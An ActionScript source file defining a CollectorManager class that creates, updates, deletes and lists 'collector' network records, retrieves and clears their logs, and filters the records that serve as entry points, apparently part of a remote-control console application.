package it.ht.rcs.console.network.controller
{
  import it.ht.rcs.console.DB;
  import it.ht.rcs.console.controller.ItemManager;
  import it.ht.rcs.console.network.model.Collector;
  
  import mx.collections.ArrayCollection;
  import mx.collections.ISort;
  import mx.collections.ListCollectionView;
  import mx.rpc.events.ResultEvent;
  
  public class CollectorManager extends ItemManager
  {
    
    public function CollectorManager() { super(Collector); }
    
    private static var _instance:CollectorManager = new CollectorManager();
    public static function get instance():CollectorManager { return _instance; }
    
    override public function refresh():void
    {
      super.refresh();
      DB.instance.collector.all(onResult);
    }
    
    private function onResult(e:ResultEvent):void
    {
      clear();
      for each (var item:* in e.result.source)
        addItem(item);
      dispatchDataLoadedEvent();
    }
    
    override protected function onItemRemove(o:*):void
    {
      DB.instance.collector.destroy(o._id);
    }
    
    override protected function onItemUpdate(event:*):void
    {
      var property:Object = new Object();
      property[event.property] = event.newValue is ArrayCollection ? event.newValue.source : event.newValue;
      DB.instance.collector.update(event.source, property);
    }
    
    public function addCollector(callback:Function):void
    {
      DB.instance.collector.create(Collector.defaultCollector(), function (e:ResultEvent):void {
        var collector:Collector = e.result as Collector;
        addItem(collector);
        callback(collector);
      });
    }
    
    public function getLogs(_id:String, callback:Function):void
    {
      DB.instance.collector.logs(_id, function(e:ResultEvent):void {
        callback(e.result as ArrayCollection);
      });
    }
    
    public function clearLogs(_id:String, callback:Function):void
    {
      DB.instance.collector.del_logs(_id, function(e:ResultEvent):void {
        callback();
      });
    }
    
    private function entryFilter(item:Object):Boolean
    {
      if (item['address'] == null || item['address'] == '')
        return false;
      
      if (item['type'] == 'local' && item['next'][0] == null)
        return true;
      
      if (item['type'] == 'remote' && item['next'][0] == null && item['prev'][0] != null)
        return true;
      
      return false;
    }
    
    public function getEntryPointsView(sortCriteria:ISort=null, filterFunction:Function=null):ListCollectionView
    {
      return super.getView(null, entryFilter);
    }
    
  }
  
}